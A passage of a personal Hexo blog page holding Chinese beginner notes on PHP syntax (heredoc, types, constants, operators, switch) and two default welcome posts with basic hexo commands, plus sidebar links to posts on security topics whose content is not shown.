<h3 id="PHP-EOF"><a href="#PHP-EOF" class="headerlink" title="PHP EOF"></a>PHP EOF</h3><p>1.必须后接分号，否则编译通不过。<br>2.EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。<br>3.结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。<br>4.开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。<br>5.当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。<br>提示：以&lt;&lt;&lt;EOF开始标记开始，以EOF结束标记结束，结束标记必须顶头写，且在结束标记末尾要有分号。</p>
<h3 id="PHP数据类型"><a href="#PHP数据类型" class="headerlink" title="PHP数据类型"></a>PHP数据类型</h3><p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。<br>var_dump()：判断一个变量的类型与长度，并输出变量的数值</p>
<h3 id="PHP类型比较"><a href="#PHP类型比较" class="headerlink" title="PHP类型比较"></a>PHP类型比较</h3><p>松散比较：使用两个等号 == 比较，只比较值，不比较类型。<br>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</p>
<h3 id="PHP常量"><a href="#PHP常量" class="headerlink" title="PHP常量"></a>PHP常量</h3><p>常量是一个简单值的标识符。该值在脚本中不能改变。<br>一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)。<br>注意： 常量在整个脚本中都可以使用。</p>
<p>设置常量，使用 define() 函数，函数语法如下：<br>bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )<br>该函数有三个参数:<br>name：必选参数，常量名称，即标志符。<br>value：必选参数，常量的值。<br>case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</p>
<h3 id="PHP字符串"><a href="#PHP字符串" class="headerlink" title="PHP字符串"></a>PHP字符串</h3><p>PHP并置运算符（.）<br>strlen() 函数返回字符串的长度（字节数）。<br>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。</p>
<h3 id="PHP运算符"><a href="#PHP运算符" class="headerlink" title="PHP运算符"></a>PHP运算符</h3><p>算术运算符，赋值运算符，递增/递减运算符，比较运算符，逻辑运算符，数组运算符，三元运算符</p>
<p>组合比较符（PHP7+），也被称之为太空船操作符，符号为&lt;=&gt;<br> 格式：<br> $c = $a &lt;=&gt; $b;<br> 解析：<br>  如果 $a &gt; $b, 则 $c 的值为 1。<br>  如果 $a == $b, 则 $c 的值为 0。<br>  如果 $a &lt; $b, 则 $c 的值为 -1。</p>
<p>优先级：<br>  &amp;&amp;  &gt;  =  &gt;  and<br>  ||  &gt;  =  &gt;  or</p>
<h3 id="PHP-If…Else"><a href="#PHP-If…Else" class="headerlink" title="PHP If…Else"></a>PHP If…Else</h3><p>if 语句 - 在条件成立时执行代码<br>if…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码<br>if…elseif….else 语句 - 在若干条件之一成立时执行一个代码块</p>
<h3 id="PHP-Switch"><a href="#PHP-Switch" class="headerlink" title="PHP Switch"></a>PHP Switch</h3><p>语法：<br>‘<?php
switch (n)
{
case label1:
    如果 n=label1，此处代码将执行;
    break;
case label2:
    如果 n=label2，此处代码将执行;
    break;
default:
    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;
}
?>’</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckse84pn600028wvj5xpt2ozd" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Hello" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/11/Hello/" class="article-date">
  <time datetime="2020-08-11T09:39:43.000Z" itemprop="datePublished">2020-08-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/11/Hello/">你好，Hexo</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to my blog!<br>I will share my life here from now on！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckse84pmm00008wvjaezy1d6d" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/11/hello-world/" class="article-date">
  <time datetime="2020-08-11T08:21:04.781Z" itemprop="datePublished">2020-08-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/11/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckse84pnm00088wvj0anb9w18" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/08/16/%E5%85%8D%E6%9D%80%E6%94%B6%E5%B0%BE%E5%92%8Cempire/">免杀收尾和empire</a>
          </li>
        
          <li>
            <a href="/2021/08/12/%E5%85%8D%E6%9D%802/">免杀2</a>
          </li>
        
          <li>
            <a href="/2021/08/09/%E5%85%8D%E6%9D%801/">免杀1</a>
          </li>
        
          <li>
            <a href="/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">armitage和漏洞复现</a>
          </li>
        
          <li>
            <a href="/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/">linux后门植入</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>